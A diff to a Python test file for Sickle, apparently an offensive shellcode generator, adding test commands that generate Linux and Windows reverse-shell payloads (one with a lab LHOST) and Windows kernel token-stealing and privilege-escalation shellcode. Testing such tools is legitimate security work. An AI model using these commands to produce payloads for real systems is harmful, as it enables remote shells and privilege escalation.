@@ -19,7 +19,7 @@ SICKLE_PATH = f"{os.path.dirname(__file__)}/../src"
 
 IGNORE = ['__init__.py', "__pycache__"]
 
-SLEEP_TIME = 0
+SLEEP_TIME = 1
 
 MODULE_TESTS = \
 {
@@ -50,7 +50,13 @@ MODULE_TESTS = \
 
 PAYLOAD_TESTS = \
 {
-    "linux": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=42 -f c" ]
+    "linux": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=42 -f c",
+               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c", ],
+    "windows": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_token_stealer -f c",
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_ace_edit PROCESS=AggregatorHost.exe -f c",
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_sysret -f c",
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f c",
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x86/kernel_token_stealer -f c", ]
 }
 
 def get_clean_module_list(path):
@@ -112,7 +118,7 @@ def test_modules():
 
 def test_payloads():
     for payload, commands in PAYLOAD_TESTS.items():
-        print(f"[*] Testing {payload} payload")
+        print(f"[*] Testing {payload} payloads")
         for i in range(len(commands)):
             execute_test(commands[i])
     return
